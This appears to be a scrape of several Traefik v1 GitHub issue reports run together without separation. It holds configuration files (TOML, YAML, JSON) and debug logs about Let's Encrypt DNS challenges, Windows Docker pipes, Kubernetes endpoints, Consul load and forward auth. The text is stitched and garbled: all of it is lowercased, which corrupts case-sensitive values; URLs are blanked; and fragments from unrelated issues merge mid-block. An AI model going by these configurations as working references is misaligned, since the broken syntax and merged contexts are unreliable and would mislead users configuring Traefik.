# domain = "docker.localhost" # expose containers by default in traefik
# default: true
# exposedbydefault = true ################################################################
# consul kv configuration backend
################################################################ # enable consul kv configuration backend.
[consul] # consul server endpoint.
# default: "127.0.0.1:8500"
endpoint = "127.0.0.1:8500" # enable watch consul changes.
# default: true
watch = true # prefix used for kv store.
# default: traefik
prefix = "traefik" # override default configuration template.
# for advanced users :)
# filename = "consul.tmpl" # use consul user/pass authentication.
# username = foo
# password = bar # enable consul tls connection.
# [consul.tls]
# ca = "/etc/ssl/ca.crt"
# cert = "/etc/ssl/consul.crt"
# key = "/etc/ssl/consul.key"
# insecureskipverify = true ################################################################
# consul catalog configuration backend
################################################################ # enable consul catalog configuration backend.
[consulcatalog]
constraints = ["tag==loadbalanced"] # default domain used.
domain = "vdomain" # consul server endpoint.
# default: "127.0.0.1:8500"
endpoint = "127.0.0.1:8500" # expose consul catalog services by default in traefik.
# default: true
exposedbydefault = true # prefix for consul catalog tags.
# default: "traefik"
prefix = "traefik" # default frontend rule for consul services.
# the format is a go template with:
# - ".servicename", ".domain" and ".attributes" available
# - "gettag(name, tags, defaultvalue)", "hastag(name, tags)" and "getattribute(name, tags, defaultvalue)" functions are available
# - "getattribute(...)" function uses prefixed tag names based on "prefix" value
# default: "host:{{.servicename}}.{{.domain}}"
frontendrule = "host:{{gettag \\"traefik.subdomain\\" .attributes .servicename }}.{{.domain}}"
</details> ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) <details>
<summary>successful load</summary> ``` jan 20 21:15:47 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:47z" level=info msg="legolog: [info] [mydomain.com] the server validated our request"
jan 20 21:15:47 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:47z" level=info msg="legolog: [info] [mydomain.com] acme: trying to solve dns-01"
jan 20 21:15:47 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:47z" level=info msg="legolog: [info] [mydomain.com] acme: checking dns record propagation using [127.0.0.1:53]"
jan 20 21:15:47 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:47z" level=info msg="legolog: [info] wait for propagation [timeout: 3m0s, interval: 5s]"
jan 20 21:15:48 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:48z" level=info msg="legolog: [info] [mydomain.com] the server validated our request"
jan 20 21:15:48 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:48z" level=info msg="legolog: [info] [*.mydomain.com] acme: cleaning dns-01 challenge"
jan 20 21:15:48 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:48z" level=info msg="legolog: [info] [mydomain.com] acme: cleaning dns-01 challenge"
jan 20 21:15:48 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:48z" level=info msg="legolog: [info] [*.mydomain.com, mydomain.com] acme: validations succeeded; requesting certificates"
jan 20 21:15:51 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:51z" level=info msg="legolog: [info] [*.mydomain.com] server responded with a certificate."
jan 20 21:15:51 dev-us-central1-loadbalancer-cluster-g00h traefik[19967]: time="2019-01-20t21:15:51z" level=debug msg="loaded acme certificates [*.mydomain.com mydomain.com]" ``` </details> <details>
<summary>failed load</summary> ``` 21:11:19 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:19z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:24 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:24z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:29 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:29z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:34 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:34z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:39 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:39z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:44 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:44z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:50 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:50z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:11:55 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:11:55z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:12:00 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:00z" level=info msg="legolog: [info] [*.mydomain.com] acme: waiting for dns record propagation."
jan 20 21:12:10 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:10z" level=info msg="legolog: [info] [mydomain.com] acme: trying to solve dns-01"
jan 20 21:12:10 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:10z" level=info msg="legolog: [info] [mydomain.com] acme: checking dns record propagation using [127.0.0.1:53]"
jan 20 21:12:10 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:10z" level=info msg="legolog: [info] wait for propagation [timeout: 3m0s, interval: 5s]"
jan 20 21:12:10 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:10z" level=info msg="legolog: [info] [mydomain.com] acme: waiting for dns record propagation."
jan 20 21:12:21 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:21z" level=info msg="legolog: [info] [mydomain.com] the server validated our request"
jan 20 21:12:21 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:21z" level=info msg="legolog: [info] [*.mydomain.com] acme: cleaning dns-01 challenge"
jan 20 21:12:21 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:21z" level=info msg="legolog: [info] [mydomain.com] acme: cleaning dns-01 challenge"
jan 20 21:12:21 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:21z" level=error msg="error getting acme certificate for domain [\\"*.mydomain.com\\" \\"mydomain.com\\"]: cannot obtain certificates: acme: error -> one or more domains had a problem:\ [*.mydomain.com] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: no txt record found at _acme-challenge.mydomain.com, url: \ "
jan 20 21:12:21 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:21z" level=info msg="retrieved acme certificates"
jan 20 21:12:21 dev-us-central1-loadbalancer-cluster-g00h traefik[19859]: time="2019-01-20t21:12:21z" level=info msg="testing certificate renew..."
lines 5 ``` </details>
traefik.toml: ```toml
address = ":8080"
domain = "docker.local"
watch = true
endpoint = "npipe:////./pipe/docker_engine" [entrypoints] [entrypoints.http] address = ":80"
``` docker-compose.yml: ```yaml
version: '2.4'
services: traefik: image: stefanscherer/traefik-windows command: --docker.endpoint=npipe:////./pipe/docker_engine --loglevel=debug ports: - "8080:8080" - "443:443" - "80:80" volumes: - .:c:/etc/traefik - type: npipe source: \\\\.\\pipe\\docker_engine target: \\\\.\\pipe\\docker_engine whoami1: image: stefanscherer/whoami labels: - "traefik.backend=whoami" - "traefik.frontend.entrypoints=http" - "traefik.frontend.rule=host:whoami.docker.local" whoami2: image: stefanscherer/whoami labels: - "traefik.backend=whoami" - "traefik.frontend.entrypoints=http" - "traefik.frontend.rule=host:whoami.docker.local" networks: default: external: name: nat
``` ### further information and suggestions i can reproduce the problem on a windows server 2019 when i also run traefik in hyperv isolation mode
when i use a new docker cli inside the same container the docker cli can communicate with the windows docker engine
in process isolation mode traefik.exe also works fine, also on windows 10 1809
i have seen that the vendoring of github.com/docker/docker/client (and maybe others) is quite behind the upstream repo
i have tried a docker cli 17.10 inside the container and can reproduce the problem in a hyperv isolated container
my conclusion is that the vendoring should be updated.
rules.toml ```toml
[backends] [backends.health] [backends.health.servers.server1] url = " " [backends.dr] [backends.dr.servers.server1] url = " " [backends.dr.servers.server2] url = " " [backends.dr.servers.server3] url = " " [backends.dr.servers.server4] url = " " [backends.dr.loadbalancer] sticky = true [backends.dr.healthcheck] path = "/gateway/health/api/v1/version" interval = "5s"
[frontends] [frontends.health] backend = "health" [frontends.health.routes.test_1] rule = "path:/health" [frontends.dev] backend = "dr" [frontends.dev.routes.test_1] rule = "pathprefixstrip:/hdp/dev/kx;addprefix:/gateway/testdev1"
``` ```toml
checknewversion = false traefiklogsfile = "/data/software/traefik/log/traefik.log" accesslogsfile = "/var/log/traefik/access.log" loglevel = "error" defaultentrypoints = ["https"] [entrypoints] #[entrypoints.http] #address = ":80" # [entrypoints.http.redirect] # entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls12" [entrypoints.traefik] address = ":8080" [entrypoints.traefik.tls] minversion = "versiontls12" [healthcheck]
interval = "10s" [api] entrypoint = "traefik" dashboard = true [ping] entrypoint = "traefik" [metrics] [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.3,1.2,5.0] [metrics.statistics] recenterrors = 10 [file]
filename = "/data/software/traefik/rules.toml" watch = true
traefik logs
time="2019-01-17t16:01:34z" level=info msg="traefik version v1.7.7 built on 2019-01-08_10:21:03am"
time="2019-01-17t16:01:34z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2019-01-17t16:01:34z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil>auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-01-17t16:01:34z" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-01-17t16:01:34z" level=info msg="starting provider configuration.provideraggregator {}"
time="2019-01-17t16:01:34z" level=info msg="starting server on :8080"
time="2019-01-17t16:01:34z" level=info msg="starting server on :80"
time="2019-01-17t16:01:34z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":null}"
time="2019-01-17t16:01:34z" level=info msg="ingress label selector is: \\"\\""
time="2019-01-17t16:01:34z" level=info msg="creating in-cluster provider client"
time="2019-01-17t16:01:35z" level=warning msg="endpoints not available for default/node-red"
time="2019-01-17t16:01:35z" level=warning msg="endpoints not available for default/jenkins-master"
time="2019-01-17t16:01:35z" level=warning msg="endpoints not available for default/mqtt"
time="2019-01-17t16:01:35z" level=info msg="server configuration reloaded on :80"
time="2019-01-17t16:01:35z" level=info msg="server configuration reloaded on :8080" ``` the endpoint not available seems to probably be the issue but the svc is associated with the right pod labels.
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": { "file": "c:/traefiklogs/logs.log", "format": "json", "filters": { "statuscodes": [ "402-404", "501-510" ], "retryattempts": true }, "fields": { "defaultmode": "drop", "names": { "backendaddr": "keep", "backendname": "keep", "downstreamstatus": "keep", "duration": "keep", "frontendname": "keep", "requestaddr": "keep", "requestline": "keep", "retryattempts": "keep", "startlocal": "keep" }, "headers": { "defaultmode": "drop", "names": { "downstream_x-operation-id": "keep", "request_x-datadog-parent-id": "keep", "request_x-datadog-trace-id": "keep" } } } }, "traefiklogsfile": "", "traefiklog": null, "tracing": { "backend": "datadog", "servicename": "traefik", "spannamelimit": 100, "jaeger": null, "zipkin": null, "datadog": null }, "loglevel": "error", "entrypoints": { "dashboard": { "address": "xxxx", "tls": null, "redirect": null, "auth": { "basic": {} }, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": { "attempts": 3 }, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "keeptrailingslash": false, "web": null, "docker": null, "file": { "watch": true, "filename": "#{configurationfile}", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "", "traefikfile": "" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": { "watch": false, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "clustermanagementurl": "xxxx", "apiversion": "3.0", "refreshseconds": 0, "tls": { "cert": "xxxx", "key": "xxxx" }, "appinsightsclientname": "xxxx", "appinsightskey": "xxxx", "appinsightsbatchsize": 0, "appinsightsinterval": 0 }, "rest": null, "api": { "entrypoint": "dashboard", "dashboard": true, "debug": true, "currentconfigurations": null, "statistics": { "recenterrors": 10 } }, "metrics": { "prometheus": null, "datadog": { "address": "xxxx", "pushinterval": "10s" }, "statsd": null, "influxdb": null }, "ping": null, "hostresolver": null, "configfile": ""
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": true, "checknewversion": false, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": { "file": "/var/log/traefik_access.log", "format": "common" }, "traefiklogsfile": "", "traefiklog": { "file": "xxxx", "format": "xxxx" }, "tracing": null, "loglevel": "debug", "entrypoints": { "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null }, "https": { "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false }, "defaultcertificate": null, "snistrict": false }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": true, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "keeptrailingslash": true, "web": null, "docker": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "domain": "xxxx", "tls": null, "exposedbydefault": false, "usebindportip": false, "swarmmode": false, "network": "", "swarmmoderefreshseconds": 15 }, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "/etc/traefik/conf.d/", "traefikfile": "" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "traefik", "dashboard": true, "debug": true, "currentconfigurations": null, "statistics": null }, "metrics": null, "ping": null, "hostresolver": null, "configfile": "/etc/traefik/traefik.toml"
``` **toml configuration**
debug = false
checknewversion = false
insecureskipverify = true
keeptrailingslash = true defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [api]
entrypoint = "traefik"
address = ":8080"
dashboard = true
debug = true [file]
watch = true
directory = "/etc/traefik/conf.d/" [traefiklog]
filepath = "/var/log/traefik.log"
[accesslog]
filepath = "/var/log/traefik_access.log" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "mydomain.com"
watch = true
exposedbydefault = false ``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
i have checked other issues related to cpu usage but they are for old versions and does not match exactly to this issue.
loglevel = "error"
#loglevel = "debug" defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" permanent = true [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme]
email = "admin@example.com"
storage = "acme.json"
#caserver = " "
acmelogging = true
entrypoint = "https" [acme.dnschallenge] provider = "route53" delaybeforecheck = 0 [[acme.domains]] main = "*.example.com" sans = ["example.com"] [[acme.domains]] main = "*.example1.com" sans = ["example1.com"] network = "emdnet" [file]
watch = true [respondingtimeouts]
idletimeout = "360s" [frontends] [frontends.slmain] backend = "host1" passhostheader = true entrypoints = ["http","https"] [frontends.slmain.routes.example] rule = "host:example.com" [frontends.slsub] backend = "host1" passhostheader = true entrypoints = ["http","https"] [frontends.slsub.routes.subexample] rule = "hostregexp:{subdomain:[a-z]+}.example.com" [frontends.intmain] backend = "host1" passhostheader = true entrypoints = ["http","https"] [frontends.intmain.routes.example1] rule = "host:example1.com" [frontends.intsub] backend = "host1" passhostheader = true entrypoints = ["http","https"] [frontends.intsub.routes.subexample1] rule = "hostregexp:{subdomain:[a-z]+}.example1.com" [backends] [backends.host1] [backends.host1.servers.server1] url = " " ```
endpoint = "__consul_endpoints__"
watch = true
prefix = "traefik"
``` ### analysis the cause of this problem appears to be the way the kv provider works under the hood
* there is a "waittree" operation, each time a tree update is registered
a new configuration template is generate by querying the relevant keys one by one (or nearly one by one)
this results on about 20 (or so) requests to consul per frontend/backend (i.e
in total a lot)
* additionally each of these requests is done if "consistent=true", which generates a lot of overhead inside the consul cluster (i.e
it puts some load on the cluster and is slow by comparison) ### suggested fix especially in case of consul all the additional request are completely unnecessary since the result of watchtree already contains all kvpairs of the tree
so instead of re-quering everything from the kv store that configuration template might es well use the output of watchtree directly.
# traefik.toml
debug = true
loglevel = "debug" defaultentrypoints = ["http", "https"] [api] entrypoint = "traefik" [docker] endpoint = "unix:///var/run/docker.sock" domain = "mydomain.tld" watch = true exposedbydefault = false [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [entrypoints.https.auth.forward] address = " "
# docker-compose.yml for auth backend
version: \'3.2\' services: auth: [...] container_name: auth labels: - "traefik.enable=true" - "traefik.frontend.rule=host:auth.mydomain.tld" ports: - "8081:80" expose: - "80"
``` --------- i'll be happy to help on a solution to this problem
as per the suggested idea, i figured adding the following lines in `middlewares/auth/forward.go` could help:
func forward(config *types.forward, w http.responsewriter, r *http.request, next http.handlerfunc) if (r.host == config.address) { next(w, r) } ...
but it can't work because the `config.address` takes the form of ` `.
loglevel = "info"
defaultentrypoints = ["http", "https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls]
email = "ronald+traefik@ch10.nl"
entrypoint = "https"
storage = "acme.json"
acmelogging = true
onhostrule = true
caserver = " " [acme.dnschallenge] resolvers = ["1.1.1.1:53"] provider = "transip"
domain = "t.ch10.nl"
exposedbydefault = false
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) this log output shows that multiple challenges are tried but only the one (docs.*) succeeds
traefik | time="2018-12-26t14:38:11z" level=info msg="starting provider *acme.provider {\\"email\\":\\"ronald+traefik@ch10.nl\\",\\"acmelogging\\":true,\\"caserver\\":\\" ",\\"storage\\":\\"acme.json\\",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"onhostrule\\":true,\\"ondemand\\":false,\\"dnschallenge\\":{\\"provider\\":\\"transip\\",\\"delaybeforecheck\\":0,\\"resolvers\\":[\\"1.1.1.1:53\\"],\\"disablepropagationcheck\\":false},\\"httpchallenge\\":null,\\"tlschallenge\\":null,\\"domains\\":null,\\"store\\":{}}"
traefik | time="2018-12-26t14:38:11z" level=info msg="testing certificate renew..."
traefik | time="2018-12-26t14:38:11z" level=info msg="server configuration reloaded on :80"
traefik | time="2018-12-26t14:38:11z" level=info msg="server configuration reloaded on :443"
traefik | time="2018-12-26t14:38:11z" level=info msg="server configuration reloaded on :8080"
traefik | time="2018-12-26t14:38:11z" level=info msg="server configuration reloaded on :80"
traefik | time="2018-12-26t14:38:11z" level=info msg="server configuration reloaded on :443"
traefik | time="2018-12-26t14:38:11z" level=info msg="server configuration reloaded on :8080"
traefik | time="2018-12-26t14:38:11z" level=info msg="the key type is empty
use default key type 4096."
traefik | time="2018-12-26t14:38:14z" level=info msg=register...
traefik | time="2018-12-26t14:38:14z" level=info msg="legolog: [info] acme: registering account for ronald+traefik@ch10.nl"
traefik | time="2018-12-26t14:38:14z" level=info msg="validating fqdn authority with dns using [1.1.1.1:53]"
traefik | time="2018-12-26t14:38:14z" level=info msg="legolog: [info] [docs.t.ch10.nl] acme: obtaining bundled san certificate"
traefik | time="2018-12-26t14:38:14z" level=info msg="legolog: [info] [traefik.t.ch10.nl] acme: obtaining bundled san certificate"
traefik | time="2018-12-26t14:38:14z" level=info msg="legolog: [info] [pihole.t.ch10.nl] acme: obtaining bundled san certificate"
traefik | time="2018-12-26t14:38:14z" level=info msg="legolog: [info] [ip.t.ch10.nl] acme: obtaining bundled san certificate"
traefik | time="2018-12-26t14:38:14z" level=info msg="legolog: [info] [portainer.t.ch10.nl] acme: obtaining bundled san certificate"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [docs.t.ch10.nl] authurl: "
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [docs.t.ch10.nl] acme: preparing to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [traefik.t.ch10.nl] authurl: "
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [traefik.t.ch10.nl] acme: could not find solver for: http-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [traefik.t.ch10.nl] acme: preparing to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [portainer.t.ch10.nl] authurl: "
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [portainer.t.ch10.nl] acme: preparing to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [pihole.t.ch10.nl] authurl: "
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [pihole.t.ch10.nl] acme: could not find solver for: http-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [pihole.t.ch10.nl] acme: preparing to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [ip.t.ch10.nl] authurl: "
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [ip.t.ch10.nl] acme: preparing to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [traefik.t.ch10.nl] acme: trying to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [traefik.t.ch10.nl] checking dns record propagation using [1.1.1.1:53]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] wait [timeout: 10m0s, interval: 10s]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [portainer.t.ch10.nl] acme: trying to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [portainer.t.ch10.nl] checking dns record propagation using [1.1.1.1:53]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] wait [timeout: 10m0s, interval: 10s]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [pihole.t.ch10.nl] acme: trying to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [pihole.t.ch10.nl] checking dns record propagation using [1.1.1.1:53]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] wait [timeout: 10m0s, interval: 10s]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [ip.t.ch10.nl] acme: trying to solve dns-01"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] [ip.t.ch10.nl] checking dns record propagation using [1.1.1.1:53]"
traefik | time="2018-12-26t14:38:15z" level=info msg="legolog: [info] wait [timeout: 10m0s, interval: 10s]"
traefik | time="2018-12-26t14:38:16z" level=info msg="legolog: [info] [docs.t.ch10.nl] acme: trying to solve dns-01"
traefik | time="2018-12-26t14:38:16z" level=info msg="legolog: [info] [docs.t.ch10.nl] checking dns record propagation using [1.1.1.1:53]"
traefik | time="2018-12-26t14:38:16z" level=info msg="legolog: [info] wait [timeout: 10m0s, interval: 10s]"
traefik | time="2018-12-26t14:42:02z" level=info msg="legolog: [info] [docs.t.ch10.nl] the server validated our request"
traefik | time="2018-12-26t14:42:04z" level=info msg="legolog: [info] [docs.t.ch10.nl] acme: validations succeeded; requesting certificates"
traefik | time="2018-12-26t14:42:09z" level=info msg="legolog: [info] [docs.t.ch10.nl] server responded with a certificate."
traefik | time="2018-12-26t14:42:09z" level=info msg="server configuration reloaded on :8080"
traefik | time="2018-12-26t14:42:09z" level=info msg="server configuration reloaded on :80"
traefik | time="2018-12-26t14:42:09z" level=info msg="server configuration reloaded on :443"```
``` the other propagation checks end up timing out (i think their txt records got overwritten by the winner that did succeed)
i've solved my direct issue by using a wildcard certificate but i wanted to report this anyway since i do think there actually is a bug
see also: possible first race condition window in `func (d *dnsprovider) present`: - #l94
- #l108 and possible second race condition window in `func (d *dnsprovider) cleanup`: - #l130
- #l144
email = "letsencrypt@mydomain.com"
storage = "/etc/traefik/acme/acme.json"
entrypoint = "https" # staging server for testing
#caserver = " "
acmelogging = true [acme.httpchallenge] entrypoint = "http" [acme.dnschallenge] provider = "rfc2136" [[acme.domains]] main = "*.mydomain.com" sans = ["mydomain.com"] [[acme.domains]] main = "*.myotherdomain.com" sans = ["myotherdomain.com"]
```
```toml # traefik.toml loglevel = "info" defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.proxyprotocol] trustedips = ["10.196.0.0/16"] [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" compress = true [entrypoints.https.proxyprotocol] trustedips = ["10.196.0.0/16"] [entrypoints.traefik] address = ":8080" [kubernetes] namespaces = ["kube-system", "routing-rules", "devops"] labelselector = "traffic-type=vpn" [kubernetes.ingressendpoint] publishedservice = "routing/router-vpn-traefik" [traefiklog] format = "json" [accesslog] format = "common" [accesslog.fields] defaultmode = "keep" [accesslog.fields.names] [accesslog.fields.headers] defaultmode = "keep" [accesslog.fields.headers.names] [api] entrypoint = "traefik" dashboard = true [api.statistics] recenterrors = 100 [metrics] [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.2,0.5,0.8,1.0,2.5,5.0,7.5,10.0] ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
{"level":"info","msg":"using toml configuration file /config/traefik.toml","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"traefik version v1.7.6 built on 2018-12-14_06:43:37am","time":"2018-12-18t21:34:22z"}
{"level":"debug","msg":"global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":{\\"format\\":\\"common\\",\\"fields\\":{\\"defaultmode\\":\\"keep\\",\\"headers\\":{\\"defaultmode\\":\\"keep\\"}}},\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":{\\"format\\":\\"json\\"},\\"tracing\\":null,\\"loglevel\\":\\"\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":{\\"regex\\":\\"^ ",\\"replacement\\":\\" 